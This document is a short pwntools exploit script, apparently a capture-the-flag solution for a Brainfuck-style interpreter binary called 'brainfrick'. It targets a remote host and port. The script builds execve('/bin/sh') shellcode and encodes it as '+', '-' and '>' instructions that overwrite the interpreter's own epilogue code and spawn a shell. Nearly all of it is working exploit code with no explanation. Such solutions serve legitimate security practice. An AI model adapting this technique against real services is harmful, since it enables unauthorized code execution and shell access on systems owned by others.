#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./brainfrick_patched")

context.binary = exe

REMOTE_NC_CMD    = "nc 140.238.91.110 36369"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b execute_code
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    op=asm(f"""
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        mov rdi, 0x68732f6e69622f        
        push rdi
        mov rdi, rsp
        mov rax, 0x3b
        mov rsi, 0
        mov rdx, 0
        syscall
        """)

    offsets = [0x48, 0xC7, 0xC0, 0x3C, 0x00, 0x00, 0x00, 0x0F, 0x0]

    payload = b"<<<<<<<<<" #sets rbx to first instruction of the epilogue

    for idx, i in enumerate(op):
        if idx<len(offsets):
            i-=offsets[idx]
            if i>=0:
                payload += b"+"*i + b">"
            else:
                payload += b"-"*abs(i) + b">"
        else:
            payload += b"+"*i + b">"


    r.sendline(payload[:-1])
    
    r.interactive()

if __name__ == "__main__":
    main()